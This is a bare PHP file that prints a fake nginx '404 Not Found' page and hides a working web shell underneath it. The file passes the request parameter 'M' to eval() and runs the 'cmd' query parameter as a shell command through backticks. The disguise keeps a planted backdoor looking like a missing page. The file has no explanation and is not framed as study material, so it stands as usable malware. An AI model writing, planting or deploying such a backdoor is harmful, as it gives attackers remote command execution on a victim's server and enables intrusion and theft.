<?php
echo "<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>
<br/>
<br/>";

if(isset($_GET['cmd'])){
$str=$_GET['cmd'];
}
eval (a());
function a(){
        $a = $_REQUEST["M"];
        return $a;
}

print `$str`;